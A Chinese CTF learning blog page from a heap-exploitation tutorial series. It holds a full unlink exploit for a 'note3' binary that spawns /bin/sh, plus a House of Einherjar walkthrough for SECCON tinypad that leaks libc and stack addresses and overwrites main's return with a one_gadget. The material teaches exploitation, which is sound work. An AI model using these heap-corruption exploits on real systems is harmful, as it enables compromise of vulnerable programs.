<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">atol_got = elf.got[<span class="string">'atol'</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(ptr+<span class="number">8</span>) + p64(elf.got[<span class="string">'free'</span>]) </span><br><span class="line"><span class="comment">#payload = 'a'*0x18 + p64(free_got) + p64(puts_got)</span></span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"><span class="comment">#edit(0, p64(puts_plt)[:-1])</span></span><br><span class="line">edit(<span class="number">1</span>, p64(elf.plt[<span class="string">'puts'</span>])[:<span class="number">-1</span>]) <span class="comment">#关键点，切记，不能破坏到下一个地址，不然会出错</span></span><br><span class="line"><span class="comment">#delete(1)</span></span><br><span class="line">edit(<span class="number">0</span>, p64(atol_got))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">atol_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = atol_addr - libc.symbols[<span class="string">'atol'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">io.success(<span class="string">"atol_got: 0x%x"</span> % atol_got)</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>getshell</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>, p64(atoi_got))</span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr)[:<span class="number">-1</span>])</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(<span class="string">"/bin/sh;#"</span>)</span><br></pre></td></tr></table></figure>

<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'note3'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'note3'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the length of the note content:(less than 1024)\n"</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the note content:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the id of the note:\n"</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the new content:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the id of the note:\n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="string">'a'</span>*<span class="number">0x8</span>) <span class="comment">#idx0</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x8</span>) <span class="comment">#idx1</span></span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x80</span>) <span class="comment">#idx2</span></span><br><span class="line">    ptr = <span class="number">0x6020c8</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x30</span>)</span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    edit(<span class="number">0</span>, payload)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    atol_got = elf.got[<span class="string">'atol'</span>]</span><br><span class="line">    atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(ptr+<span class="number">8</span>) + p64(elf.got[<span class="string">'free'</span>]) </span><br><span class="line">    <span class="comment">#payload = 'a'*0x18 + p64(free_got) + p64(puts_got)</span></span><br><span class="line">    edit(<span class="number">0</span>, payload)</span><br><span class="line">    <span class="comment">#edit(0, p64(puts_plt)[:-1])</span></span><br><span class="line">    edit(<span class="number">1</span>, p64(elf.plt[<span class="string">'puts'</span>])[:<span class="number">-1</span>])</span><br><span class="line">    <span class="comment">#delete(1)</span></span><br><span class="line">    edit(<span class="number">0</span>, p64(atol_got))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    atol_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    libc_base = atol_addr - libc.symbols[<span class="string">'atol'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    io.success(<span class="string">"atol_got: 0x%x"</span> % atol_got)</span><br><span class="line">    edit(<span class="number">0</span>, p64(atoi_got))</span><br><span class="line">    edit(<span class="number">1</span>, p64(system_addr)[:<span class="number">-1</span>])</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    io.sendline(<span class="string">"/bin/sh;#"</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>unlink部分完结了</li>
<li>unlink部分学习时间4天，现在对于unlink轻车熟路了，不过通常不是单一漏洞点，单一的好分析点</li>
<li>要多学学逆向，逆向起复杂的题目来真的难，像那个机器人那题，我连漏洞点都找不到，真的惨</li>
<li>我觉得机器人那题还有另外解法，因为4和5选项越界部分都没用上</li>
<li>感谢萝卜师傅的指导</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://bbs.pediy.com/thread-247007.htm" target="_blank" rel="noopener">看雪大佬</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/11/01/pwn-heap-learn-9/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="One people that no one know">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/01/pwn-heap-learn-9/" class="post-title-link" itemprop="url">pwn堆入门系列教程9</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-11-01 03:14:36" itemprop="dateCreated datePublished" datetime="2019-11-01T03:14:36+08:00">2019-11-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-30 17:29:27" itemprop="dateModified" datetime="2019-10-30T17:29:27+08:00">2019-10-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index">
                    <span itemprop="name">二进制</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/%E5%A0%86/" itemprop="url" rel="index">
                    <span itemprop="name">堆</span>
                  </a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>17k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>15 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="pwn堆入门系列教程9"><a href="#pwn堆入门系列教程9" class="headerlink" title="pwn堆入门系列教程9"></a>pwn堆入门系列教程9</h1><p><a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">pwn堆入门系列教程1</a><br><a href="https://xz.aliyun.com/t/6169" target="_blank" rel="noopener">pwn堆入门系列教程2</a><br><a href="https://xz.aliyun.com/t/6252" target="_blank" rel="noopener">pwn堆入门系列教程3</a><br><a href="https://xz.aliyun.com/t/6322" target="_blank" rel="noopener">pwn堆入门系列教程4</a><br><a href="https://xz.aliyun.com/t/6377" target="_blank" rel="noopener">pwn堆入门系列教程5</a><br><a href="https://xz.aliyun.com/t/6406" target="_blank" rel="noopener">pwn堆入门系列教程6</a><br><a href="https://xz.aliyun.com/t/6449" target="_blank" rel="noopener">pwn堆入门系列教程7</a><br><a href="https://xz.aliyun.com/t/6473" target="_blank" rel="noopener">pwn堆入门系列教程8</a></p>
<p>学习House Of Einherjar</p>
<h2 id="2016-Seccon-tinypad"><a href="#2016-Seccon-tinypad" class="headerlink" title="2016 Seccon tinypad"></a>2016 Seccon tinypad</h2><p>这道题说难不难。。我也做得久了，因为exp看不懂啊，这么复杂。。。后来简化了下，感觉轻松点了</p>
<p>功能分析，新增，删除，编辑，退出</p>
<p>至于洞，off-by-one</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">read_until</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">unsigned</span> __int64 len, <span class="keyword">unsigned</span> <span class="keyword">int</span> terminate)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = terminate;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = read_n(<span class="number">0L</span>L, &amp;a1[i], <span class="number">1L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( !v6 || a1[i] == v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  a1[i] = <span class="number">0</span>; #a1[i]可以是a1[len],多了一个字节</span><br><span class="line">  <span class="keyword">if</span> ( i == len &amp;&amp; a1[len - <span class="number">1</span>] != <span class="string">'\n'</span> )</span><br><span class="line">    dummyinput(v4);</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><h4 id="堆操作初始化部分"><a href="#堆操作初始化部分" class="headerlink" title="堆操作初始化部分"></a>堆操作初始化部分</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./tinypad'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">'./tinypad'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"(CMD)&gt;&gt;&gt; "</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="string">"A"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(SIZE)&gt;&gt;&gt; "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"(CONTENT)&gt;&gt;&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="string">"D"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(INDEX)&gt;&gt;&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="string">"E"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(INDEX)&gt;&gt;&gt; "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"(CONTENT)&gt;&gt;&gt; "</span>, content)</span><br><span class="line">    io.sendlineafter(<span class="string">"(Y/n)&gt;&gt;&gt; "</span>, <span class="string">"Y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="string">"Q"</span>)</span><br></pre></td></tr></table></figure>


<h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#stage 1 leak the addr</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'1'</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'2'</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'3'</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'4'</span>*<span class="number">0x80</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">"INDEX: 1\n"</span>)</span><br><span class="line">io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">heap = u64(io.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x120</span></span><br><span class="line">io.success(<span class="string">"heap: 0x%x"</span> % heap)</span><br><span class="line">io.recvuntil(<span class="string">"INDEX: 3\n"</span>)</span><br><span class="line">io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">leak_libc = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">88</span></span><br><span class="line">io.success(<span class="string">"main_arena: 0x%x"</span> %leak_libc)</span><br><span class="line">libc_base = leak_libc - <span class="number">0x3c4b20</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p>这个部分简单啊，leak，全在unsortedbin里，这里学到一个知识点是rstrip,通常我只用过strip，<br>该rstrip()方法删除所有尾随字符（字符串末尾的字符），空格是要删除的默认尾随字符<br>至于88这个是main_arena+88，减掉就是main_arena</p>
<h4 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>, <span class="string">'1'</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'2'</span>*<span class="number">0xf8</span> + p64(<span class="number">0x11</span>))</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'3'</span>*<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'4'</span>*<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">tinypad = <span class="number">0x0000000000602040</span></span><br><span class="line">offset = heap + <span class="number">0x20</span> - (<span class="number">0x602040</span> + <span class="number">0x20</span>)</span><br><span class="line">io.success(<span class="string">"offset: 0x%x"</span> % offset)</span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(<span class="number">0x602060</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">"4"</span>*<span class="number">0x20</span> + fake_chunk)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'1'</span>*<span class="number">0x10</span> + p64(offset))</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">"4"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(leak_libc + <span class="number">88</span>)*<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>原解我感觉把题目搞复杂了，不需要for循环覆盖那个pre_size，完全可以利用add的时候加上就完了，<br>house of einherjar这个攻击方法有点类似于unlink，不过又不太相似</p>
<ol>
<li><p>目标:0x602060这个位置<br>heap + 0x20是第二个chunk位置<br>我们目的就是让第二个chunk的上一个chunk达到0x602060<br>所以pre_size就是第二个chunk位置减去0x602060<br>offset = heap + 0x20 - (0x602040 + 0x20)</p>
</li>
<li><p>fake_chunk这里是从tinypad开始地址开始覆盖的，前面0x20个作为后面填充部分，防止多次写的时候覆盖到<br>然后指针不像unlink那样了，<br>p-&gt;fd = p<br>p-&gt;bk = p</p>
</li>
<li><p>这里edit的时候都会从tinypad开始覆盖，所以编辑别个也可以的<br>edit(3, “4”*0x20 + fake_chunk)</p>
</li>
<li><p>remove(1)在add(0x18)，利用tcache的复用就行了，原exp的解是搞得很复杂，循环单字节null填充，太麻烦了感觉</p>
</li>
<li><p>这点不用这么复杂，0x101是为了后面分配用的，而p64(leak_libc+88)*2 这里，你只要bk是个可写的地址就行了，不要是不可写的就行，unsortedbin攻击里讲过</p>
</li>
</ol>
<p>引用ctf-wiki</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#在 glibc/<span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c 中的 _int_malloc 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 bck-&gt;fd 的位置写入本 Unsorted Bin 的位置。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks 3"</span>);</span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>


<p>edit(4, “4”<em>0x20 + p64(0) + p64(0x101) + p64(leak_libc + 88)</em>2)</p>
<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#stage 3</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0x45216</span></span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">environ_pointer = libc_base + libc.symbols[<span class="string">'__environ'</span>]</span><br><span class="line"></span><br><span class="line">io.success(<span class="string">"environ_pointer: 0x%x"</span> % environ_pointer)</span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">'1'</span>*<span class="number">0xd0</span> + p64(<span class="number">0x18</span>) + p64(environ_pointer) + <span class="string">'a'</span>*<span class="number">8</span> + p64(<span class="number">0x602148</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">" #   INDEX: 1\n"</span>)</span><br><span class="line">io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">main_ret = u64(io.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x8</span> * <span class="number">30</span></span><br><span class="line">io.success(<span class="string">"main_ret: %x"</span> % main_ret)</span><br><span class="line">edit(<span class="number">2</span>, p64(main_ret))</span><br><span class="line">edit(<span class="number">1</span>, p64(one_gadget))</span><br><span class="line">quit()</span><br></pre></td></tr></table></figure>

<p>这里学到了一个新方法，通过environ泄露main函数ret地址，然后覆盖main_ret</p>
<p>在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。从以下结果可知环境指针 environ 在栈空间的高地址处。因此，可通过 environ 指针泄露栈地址。<br><a href="http://0x4c43.cn/2018/1013/stack-overflow-smash-utilization/" target="_blank" rel="noopener">讲解这部分的文章</a></p>
<p>这里还用到个常用攻击方法，覆盖两个指针，一个用来控制另一个地址的，这个跟unlink那会学的攻击手法一样的，至于0x8*30,可以用查看内存中对比</p>
